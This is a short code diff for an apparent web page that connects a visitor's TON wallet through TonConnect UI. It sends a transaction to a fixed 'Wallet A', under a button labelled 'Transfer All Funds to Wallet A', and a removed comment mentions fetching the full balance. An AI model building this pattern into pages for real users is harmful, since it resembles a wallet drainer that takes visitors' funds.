@@ -9,7 +9,7 @@
 </head>
 <body>
     <h1>TON Wallet Transfer</h1>
-    <button id="connectBtn">Connect Wallet</button>
+    <div id="ton-connect"></div> <!-- Ensure this element exists -->
     <button id="transferBtn" style="display: none;">Transfer All Funds to Wallet A</button>
     <p id="status"></p>
 
@@ -21,6 +21,7 @@
         // Initialize TonConnectUI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://tonconnect.org/manifest.json',
+            buttonRootId: 'ton-connect', // Matches the ID in the HTML
         });
 
         let walletDetails = null;
@@ -45,12 +46,11 @@
 
             try {
                 const tonweb = new TonWeb();
-                const amountNanoTON = 1000000; // Change this to fetch the wallet's full balance
 
-                // Create transaction data
+                // Prepare a transaction
                 const transaction = {
                     to: walletAAddress,
-                    value: amountNanoTON, // Amount to transfer in nanoTON
+                    value: 1000000, // Example amount in nanoTON
                     stateInit: undefined,
                     payload: undefined,
                 };
